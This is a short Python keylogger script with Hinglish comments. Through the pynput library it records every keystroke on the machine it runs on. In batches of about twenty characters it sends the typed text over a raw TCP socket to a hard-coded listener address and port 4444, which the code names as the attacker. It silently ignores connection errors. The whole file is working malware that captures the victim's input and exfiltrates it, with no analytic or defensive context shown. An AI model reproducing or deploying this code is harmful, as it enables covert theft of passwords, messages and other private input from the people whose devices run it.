import pynput.keyboard
import socket
import threading
import time

# Target Linux IP & port
IP = "192.168.0.106"   # <-- yaha apne Linux ka IP daal
PORT = 4444           # Linux listener ka port

log = ""

def send_to_attacker(message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(message.encode())
        s.close()
    except:
        pass  # Agar connection fail ho jaye to silently ignore

def process_key(key):
    global log

    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

    if len(log) > 20:  # Jab 20 character ho jaye to bhej do
        send_to_attacker(log)
        log = ""

def start_logger():
    with pynput.keyboard.Listener(on_press=process_key) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_logger)
keylogger_thread.start()
